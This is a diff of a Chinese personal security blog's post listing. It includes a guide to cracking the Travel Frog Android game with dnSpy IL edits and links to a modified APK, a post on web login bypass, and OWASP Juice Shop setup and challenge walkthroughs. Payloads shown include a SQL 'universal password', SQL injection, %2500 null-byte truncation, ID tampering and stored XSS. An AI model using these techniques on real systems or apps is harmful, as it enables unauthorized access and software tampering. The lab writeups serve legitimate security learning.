+<p>百度网盘链接:<a href="https://pan.baidu.com/s/1kVU10J9" target="_blank" rel="noopener">https://pan.baidu.com/s/1kVU10J9</a> 密码：9xg7</p>
+</blockquote>
+<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><p>我这里使用的旅行青蛙版本为v1.0.4，Android版（ios不会啊），百度下载了之后，就可以进行下一步了。</p>
+<blockquote>
+<p>百度网盘链接:<a href="https://pan.baidu.com/s/1nxj6GTr" target="_blank" rel="noopener">https://pan.baidu.com/s/1nxj6GTr</a> 密码：0uu1</p>
+</blockquote>
+<h2 id="下载反编译工具-dnSpy"><a href="#下载反编译工具-dnSpy" class="headerlink" title="下载反编译工具:dnSpy"></a>下载反编译工具:dnSpy</h2><blockquote>
+<p>百度网盘链接:<a href="https://pan.baidu.com/s/1eUaX5T4" target="_blank" rel="noopener">https://pan.baidu.com/s/1eUaX5T4</a> 密码：tuxl</p>
+</blockquote>
+<h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><p>1.先将下载好的旅行青蛙的apk文件改名为zip文件后，用解压工具打开，找到Assembly-Csharp.dll<br><img src="http://t1.aixinxi.net/o_1c7fk6r8fui8tn71q94skb8gqa.jpg-j.jpg" alt=""></p>
+<p>  2.用dnspy来打开dll文件，就可以看到内容了<br>  <img src="http://t1.aixinxi.net/o_1c7fk8f6i1n8labp1e52dt7oh7a.jpg-j.jpg" alt=""></p>
+<p>  3.找到关于抽奖券的位置<br>  <img src="http://t1.aixinxi.net/o_1c7fkaiu31ess18f11kr4s0l9ga.jpg-j.jpg" alt=""></p>
+<p>  4.日文没关系，这不还是有个汉字嘛，去dnspy上搜索“足”字，点开PushRoolButton就可以看到相关的内容了<br> <img src="http://t1.aixinxi.net/o_1c7fkf0k91p6f155s198j1it0cala.jpg-j.jpg" alt=""></p>
+<p> 可以看到这里有和抽奖券类似的判断，点击即可跳转到相关方法<br> <img src="http://t1.aixinxi.net/o_1c7fkhspk1nmfhmojutamjhdba.jpg-j.jpg" alt=""></p>
+<p>  猜测这里表示奖券的库存<br>  <img src="http://t1.aixinxi.net/o_1c7fkkeg8jf87251lhv75v102pa.jpg-j.jpg" alt=""></p>
+<p>  点击ticket后，Ctrl+F继续搜索ticket即可看到奖券开始的默认值<br>  <img src="http://t1.aixinxi.net/o_1c7fkmhov4jj1vvg7fb14ov19era.jpg-j.jpg" alt=""></p>
+<p>5.开始修改数值<br>右键点击编辑IL指令，将ldc.i4.0换成ldc.i4，然后就可以看到后面出现了个0，将0改为你想要的（奖券）数值即可<br><img src="http://t1.aixinxi.net/o_1c7fkr8gauh512nk1kprp9c3l7a.jpg-j.jpg" alt=""></p>
+<p>  点击确定，就可以看到数值变化了<br>  <img src="http://t1.aixinxi.net/o_1c7fks97derm1rv33pn1kmr26fa.jpg-j.jpg" alt=""></p>
+<p>  6.但是奖卷总有一天还是会抽完的，从下图也可以看出来判断内容，小于5就会提示抽奖券不足<br>  <img src="http://t1.aixinxi.net/o_1c7fl0bddv07qbauqjarnbhra.jpg-j.jpg" alt=""></p>
+<p>  所以我们要让它抽奖不会减少奖券的数量,点击TicketStock来查看相关内容，可以看到return的值为99999，将数值改为9000即可（我这里已经更改了）<br>  <img src="http://t1.aixinxi.net/o_1c7fl57022q819cc1tgj38um93a.jpg-j.jpg" alt=""></p>
+<p>  抽奖券就算是修改完了，但是还有另外一个消耗品，那就是三叶草，同理，用上面修改抽奖券的方法，修改CloverPointStock()<br>  <img src="http://t1.aixinxi.net/o_1c7fl9kpip9r1qf03ds17rpqr8a.jpg-j.jpg" alt=""></p>
+<p>  然后将其返回值(return)修改为8888,就可以随心所欲的买买买了<br>  <img src="http://t1.aixinxi.net/o_1c7flcolg22m1jc31opsed31kvfa.jpg-j.jpg" alt=""></p>
+<p>  打包后安装即可完成<br>  <img src="http://t1.aixinxi.net/o_1c7fleisu8j7gfc1bvv13u2b4aa.jpg-j.jpg" alt=""></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>  这个游戏修改起来比较简单，首先判断为该游戏为Unity3d。然后使用dnSpy来对Assembly-CSharp.dll文件进行修改。根据特定的字符串找到需要修改的位置，修改后进行打包安装后即可</p>
+<blockquote>
+<p>参考文章:<a href="https://paper.seebug.org/519/" target="_blank" rel="noopener">https://paper.seebug.org/519/</a></p>
+</blockquote>
+<h2 id="3月2日更新：修改掉落概率"><a href="#3月2日更新：修改掉落概率" class="headerlink" title="3月2日更新：修改掉落概率"></a>3月2日更新：修改掉落概率</h2><p>上面是已经将消耗性道具都修改为无限了，但是碍于“血统问题”，还是抽不到自己想要的东西，那么今天就把概率也给修改了</p>
+<h2 id="分析控制概率的代码"><a href="#分析控制概率的代码" class="headerlink" title="分析控制概率的代码"></a>分析控制概率的代码</h2><p>右键点击一下PrizeBallName查看在哪里被使用了<br><img src="http://t1.aixinxi.net/o_1c7i8l07o2am1p9ap8j1kbsio3a.jpg-j.jpg" alt=""></p>
+<p>  可以看到在PushRollButton里面被读取了，单击进入，找到代码<br>  <img src="http://t1.aixinxi.net/o_1c7i9086nq451q9mvgj11ui49ma.jpg-j.jpg" alt=""></p>
+<p>  this.result这个result决定了抽到的是什么颜色的球，分析代码可以看出PrizeBalls中定义了不同颜色的球摇出概率,所以单击PrizeBalls来查看<br>  接着就会跳到这里，分别定义了不同颜色的球的概率<br>  <img src="http://t1.aixinxi.net/o_1c7i9dau61dodke9du5hr1559a.jpg-j.jpg" alt=""></p>
+<p>   然后右键单击编辑方法，随心所欲更改概率即可<br>   <img src="http://t1.aixinxi.net/o_1c7i9c2qp3eri141npv1k1p16aia.jpg-j.jpg" alt=""></p>
+<p>  我这里将白色和蓝色的调成打死都不出，然后将黄玉改为最高了<br>  <img src="http://t1.aixinxi.net/o_1c7i9j4urqamndn1g9fm91k0ta.jpg-j.jpg" alt=""></p>
+<p>  接着，打包签名安装即可<br>  <img src="http://t1.aixinxi.net/o_1c7i9l75tgjg1kdi1il087ke9ca.jpg-j.jpg" alt=""></p>
+<blockquote>
+<p>百度网盘链接：<a href="https://pan.baidu.com/s/1kWmI0Gf" target="_blank" rel="noopener">https://pan.baidu.com/s/1kWmI0Gf</a> 密码：6b56</p>
+</blockquote>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/">windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向破解/">逆向破解</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-突破WEB登陆" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/02/27/突破WEB登陆/" class="article-date">
+      <time datetime="2018-02-27T00:34:13.000Z" itemprop="datePublished">2018-02-27</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/02/27/突破WEB登陆/">突破web系统登录（一）</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="突破web系统登录（一）"><a href="#突破web系统登录（一）" class="headerlink" title="突破web系统登录（一）"></a>突破web系统登录（一）</h1><p>在WEB渗透时，我们通常都会遇到一些需要登录进去才能进一步做测试的系统，但是又碍于没有密码或者用户名，那么下面就简单介绍一些方法</p>
+<h3 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h3><ul>
+<li>登录绕过，无疑是最轻松，最省时间的方法了，目前的主要方法有:<br>1.SQL万能密码登录，语句：admin’ or ‘1’=’1’ –<br>2.XSS获取别的用户的Cookie后，替换登录系统<br>3.通过爆破目录、Google Hacking、目录文件扫描等方法，找到没有授权、做防护的页面，直接进行绕过<br>4.通过别人留下来的后门文件或这默认的管理员密码等，直接登录<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3></li>
+<li>除去登录绕过，还可以尝试用工具进行爆破，但是猜解一个用户的管理员密码则需要成千上万条密码来尝试。<br>1.用BurpSuite进行密码爆破<br>2.利用Python脚本进行爆破，例如htpwdScan(<a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a>)<br>3.利用一些网上别人整理好的密码字典进行爆破，也可做到高效。例如一些TOP500、TOP1000(<a href="https://github.com/LandGrey/pydictor/blob/master/wordlist/SEDB/ChineseWeakPass1000.txt)，以及TOP1W(https://github.com/danielmiessler/SecLists/tree/master/Passwords" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor/blob/master/wordlist/SEDB/ChineseWeakPass1000.txt)，以及TOP1W(https://github.com/danielmiessler/SecLists/tree/master/Passwords</a>)<br>4.如果还是没有猜解成功的话，那可以根据对方的信息（例如邮箱、姓名、生日）等构造一个字典进行爆破（kali工具推荐cupp，安装命令apt-get install cupp,github链接:<a href="https://github.com/Mebus/cupp）" target="_blank" rel="noopener">https://github.com/Mebus/cupp）</a></li>
+</ul>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Juice-Shop Windows平台搭建" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/02/26/Juice-Shop Windows平台搭建/" class="article-date">
+      <time datetime="2018-02-26T02:03:56.000Z" itemprop="datePublished">2018-02-26</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/02/26/Juice-Shop Windows平台搭建/">Juice-Shop Windows平台搭建</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>Juice-shop是OWASP的一款漏洞环境，里面包括了目前的TOP10漏洞，还有一些有深度的漏洞，难度各有不同，juice-shop可以用docker来部署也可以在windows或linux的环境下用node.js发布出来，下面就开始搭建</p>
+<hr>
+<p>1.首先在github上下载源码<br><code>https://github.com/bkimminich/juice-shop/releases/tag/v6.4.2</code></p>
+<p><img src="http://i2.51cto.com/images/blog/201802/26/529e5cae7f8415dd5be057ec26112ec5.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+<p>  下载自己对应的系统以及node版本的文件，要注意juice-shop-6.4.2后面跟着的这个node，如果是node6那么你就需要去按照对应的node.js为6.x版本的才能成功发布出来（node.js下载可到<a href="https://github.com/nodejs/Release）" target="_blank" rel="noopener">https://github.com/nodejs/Release）</a><br>    <img src="http://i2.51cto.com/images/blog/201802/26/268c3bf9d8fea4d35987a41678b34401.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+<p>  2.安装node，打开你下载的node安装包，安装时全部默认即可，然后先检验node.js是否安装成功<br>Win+r打开运行输入cmd开启命令行，再打node –v查看node版本如果可以看到版本且是自己需要的版本说明安装无误<br><img src="http://i2.51cto.com/images/blog/201802/26/2becc0a384342a8319c1b45d0753136d.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+<p>  3.发布Juice-Shop<br>  打开CMD，使用cd命令来进入Juice-shop源码文件夹（也可在文件夹中Shift+鼠标右键，点击“在此处打开命令窗口”)<br>  然后输入nmp start<br><img src="http://i2.51cto.com/images/blog/201802/26/cf0e1ae618ad3c061ea0823599569f6d.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+<p>  完成<br> 用浏览器访问本地3000端口即可看到页面<br> <img src="http://i2.51cto.com/images/blog/201802/26/2d146b1db29c08e120923c46d8169278.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+<hr>
+<p>  感谢@butters对该文章的技术支持。软件链接地址均为@butters提供。如需转载，请注明出处。否则将追究法律责任</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/">windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-OWASP Juice Shop v6.4.1部分题目答案（二）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/02/02/OWASP Juice Shop v6.4.1部分题目答案（二）/" class="article-date">
+      <time datetime="2018-02-02T10:56:40.000Z" itemprop="datePublished">2018-02-02</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/02/02/OWASP Juice Shop v6.4.1部分题目答案（二）/">OWASP Juice Shop v6.4.1部分题目答案（二）</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="OWASP-Juice-Shop-v6-4-1部分题目答案（二）"><a href="#OWASP-Juice-Shop-v6-4-1部分题目答案（二）" class="headerlink" title="OWASP Juice Shop v6.4.1部分题目答案（二）"></a>OWASP Juice Shop v6.4.1部分题目答案（二）</h1><blockquote>
+<p>上一篇链接:<a href="http://blog.51cto.com/10506646/2067233" target="_blank" rel="noopener">http://blog.51cto.com/10506646/2067233</a></p>
+</blockquote>
+<ol>
+<li>Confidential Document<br>通过抓包可以分析出网站有一个名为ftp的目录，进入<br><img src="http://i2.51cto.com/images/blog/201802/02/3f7feb0041880dfa580af3f1d97c0746.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>全部访问一遍即可完成</li>
+<li>Redirects Tier 1<br>通过分析付款界面的源代码可以发现一串隐藏的代码，复制链接，打开即可完成<br><img src="http://i2.51cto.com/images/blog/201802/02/900da425bb8909bcc29c3ad8ff75c4a4.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></li>
+<li>Christmas Special<br>找到一个“特别的圣诞节商品”，先去search查看出错的代码,输入’；来返回<br><img src="http://i2.51cto.com/images/blog/201802/02/6101d314cd963c0e30cf1f979ac1094f.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>使用burpsuite抓取数据包<br><img src="http://i2.51cto.com/images/blog/201802/02/9f07788d463e6eafd58961034522471b.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>修复语句,便可看到”不存在”的圣诞节商品<br><code>&#39;))--</code><br><img src="http://i2.51cto.com/images/blog/201802/02/3c9185e7040f91ab86643a92f97a6559.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>加入购物篮后结账即可</li>
+<li>Easter Egg Tier 1<br>找到隐藏的复活节彩蛋,根据Confidential Document这题可以得出有个ftp目录，进入，看到一个名为eastere.gg，但服务器只允许.md和.pdf文件打开，打不卡.gg，这个时候使用00截断即可<br><img src="http://i2.51cto.com/images/blog/201802/02/c90f70f187b450e9bf458bace04366fb.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><blockquote>
+<p>为什么这里不是直接%00,而是%2500呢，因为网址url会对特殊的字符串进行转义，% = %25  参考文章:<a href="http://blog.csdn.net/pcyph/article/details/45010609" target="_blank" rel="noopener">http://blog.csdn.net/pcyph/article/details/45010609</a></p>
+</blockquote>
+</li>
+</ol>
+<p>5.Forged Feedback<br>用别人的用户名来反馈，通过Basket Access这题可以得出服务器存在越权。点击“联系我们”，提交一个反馈，然后抓包<br><img src="http://i2.51cto.com/images/blog/201802/02/63a25b8fd72cdc7125033c737aa9a97f.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>UserID:1代表admin，将1换为其他数字提交即可<br>6.Upload Type<br>在“投诉”里面上传一个不是pdf文件的文件即可<br><img src="http://i2.51cto.com/images/blog/201802/02/23f0063b077f8b981216da05d4e67376.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>将数据包中的filename，文件后缀更改即可<br>7.Upload Size<br>上传的文件大于100KB<br><img src="http://i2.51cto.com/images/blog/201802/02/826844671dbcd4930cc81db9f33db14d.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>网站做了限制，无法直接上传，直接改包<br><img src="http://i2.51cto.com/images/blog/201802/02/1ec3decdf9780b127725dd1fa026ada6.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>将内容改掉，乱输入点东西，大于100KB即可<br>8.XSS Tier 2<br>这个XSS不是直接插入框弹出就完事了，而是一个持续性XSS，到注册用户的界面，正常提交一个表单，抓包，然后将邮箱换成XSS语句<br><img src="http://i2.51cto.com/images/blog/201802/02/b5181841cfac13a823395cca0f69490e.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br><del>然后你就会发现报错了</del><br>查看报错信息<br><img src="http://i2.51cto.com/images/blog/201802/02/0abb32f5d8a92fa05430497c96151891.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>发现每一个双引号前都要加一个反斜杠，重新构造语句<br><img src="http://i2.51cto.com/images/blog/201802/02/ce5848a324805f321f19285c118c33c7.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""><br>提交，接着登陆admin这个用户，进入/administration页面，成功<br><img src="http://i2.51cto.com/images/blog/201802/02/7c20c36302fb15e3f7c8e9be613ea793.jpg?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_100,g_se,x_10,y_10,shadow_90,type_ZmFuZ3poZW5naGVpdGk=" alt=""></p>
+<blockquote>
+<p>因为/administration是管理界面，可以看到所有注册的用户，这里提交的XSS就会被执行</p>
+</blockquote>
+<hr>
+<blockquote>
+<p>小结:<br>还是因为自身技术不够，所以只完成了不到40%分数的题目，很多题目都考验代码审计以及抓包工具的使用，十分有意思的渗透环境</p>
+</blockquote>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
     </div>
 
       
@@ -1037,7 +1223,7 @@ Starting vsftpd for vsftpd:                                 [  OK  ]
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
+      <a class="extend prev" rel="prev" href="/page/3/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">Next &raquo;</a>
     </nav>
   
 
